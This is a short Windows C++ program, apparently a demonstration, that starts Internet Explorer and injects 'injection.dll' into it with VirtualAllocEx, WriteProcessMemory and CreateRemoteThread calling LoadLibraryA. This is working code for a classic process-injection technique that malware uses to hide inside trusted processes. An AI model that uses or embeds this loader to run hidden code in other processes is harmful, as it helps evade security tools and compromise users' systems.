// process_injection.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>

int _tmain(int argc, _TCHAR* argv[])
{
	char ie[MAX_PATH];
	char dll[MAX_PATH];
	GetEnvironmentVariable("programfiles",ie,sizeof(ie));
	strcat(ie,"\\Internet Explorer\\iexplore.exe");
	strcpy(dll,"injection.dll");
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	CreateProcess(NULL,ie,NULL,NULL,false,0,NULL,NULL,&si,&pi);
	HANDLE baseAddress=VirtualAllocEx(pi.hProcess,NULL,256,MEM_COMMIT,PAGE_READWRITE);
	WriteProcessMemory(pi.hProcess,baseAddress,dll,sizeof(dll),NULL);
	CreateRemoteThread(pi.hProcess,NULL,0,(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32"),"LoadLibraryA"),baseAddress,0,NULL);
	Sleep(10000);
	TerminateThread(pi.hThread,0);
	return 0;
}

